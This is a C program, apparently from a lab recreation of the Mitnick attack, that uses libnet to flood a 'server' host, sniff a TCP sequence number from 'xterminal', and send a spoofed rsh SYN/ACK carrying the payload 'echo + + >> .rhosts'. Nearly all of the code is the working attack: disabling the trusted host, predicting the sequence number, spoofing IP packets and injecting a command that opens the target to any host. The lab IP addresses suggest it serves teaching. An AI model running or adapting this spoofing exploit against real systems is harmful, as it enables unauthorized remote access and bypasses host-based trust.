#include <stdio.h>
#include <stdlib.h>
#include <libnet.h>
#include <unistd.h>
#include <pthread.h>
#include "flood.h"
#include "sender.h"
#include "packetsniffer.h"
#include <pcap/pcap.h>
void sendExploit(uint32_t next, char *payload, int plen, u_long xterminal, u_long server, libnet_t *l);
int main()
{

    //Defining variables
    u_long server;
    u_long xterminal;
    u_long kevin;
    libnet_t *l;  //Libnet Context
    char errbuf[LIBNET_ERRBUF_SIZE];
    l = libnet_init(LIBNET_RAW4, NULL, errbuf);

    if ( l == NULL ) {
    fprintf(stderr, "libnet initialization failed: %s\n", errbuf);
    exit(EXIT_FAILURE);
    }

    libnet_seed_prand(l);

    //Retrieving IP by conversion
    if((server=libnet_name2addr4(l,"172.16.45.3", LIBNET_DONT_RESOLVE))==(u_long)-1)
    {
        fprintf(stderr, "Error in server ip conversion");
        exit(0);
    }    
    if((xterminal=libnet_name2addr4(l,"172.16.45.4", LIBNET_DONT_RESOLVE))==(u_long)-1)
    {
        fprintf(stderr, "Error in xterminal ip conversion");
        exit(0);
    }
    if((kevin=libnet_name2addr4(l,"172.16.45.2", LIBNET_DONT_RESOLVE))==(u_long)-1)
    {
        fprintf(stderr, "Error in kevin ip conversion");
        exit(0);        
    };



    //Server flood
    fflush(stdout);
    printf("\n Disabling server...");
    fflush(stdout);
    disableServer(l,kevin,server);
    usleep(1000);
    uint32_t next=packetSnifferInitialize(l,kevin,xterminal);
    printf("\n Next: %u",next);
    fflush(stdout);
    printf("\n EXPLOITING");
    sendExploit(next,"0\0tsutomu\0tsutomu\0echo + + >> .rhosts",38,xterminal,server, l );
    usleep(1000);

    printf("\n Enabling the server...");
    fflush(stdout);
    enableServer(l,kevin,server);

    //restore server
    libnet_destroy(l);
    return 0;
}

void sendExploit(uint32_t next, char *payload, int plen, u_long xterminal, u_long server, libnet_t *l)
{

//SYN
        tcpTagCreate(l,(u_int32_t)514, (u_int32_t)514,(u_int32_t)1928373,(u_int32_t)1,NULL,0,TH_SYN);
        ipTagCreate(l,(u_int32_t)server,(u_int32_t)xterminal,NULL,(u_int32_t)0);
        sendPacket(l);
        sleep(1);
//ACK
        tcpTagCreate(l,(u_int32_t)514, (u_int32_t)514,(u_int32_t)1928374,htonl(next+1),(char*)payload,plen, (u_int8_t)TH_ACK | TH_PUSH);
        ipTagCreate(l,(u_int32_t)server,(u_int32_t)xterminal,NULL,(u_int32_t)plen);
        sendPacket(l);
}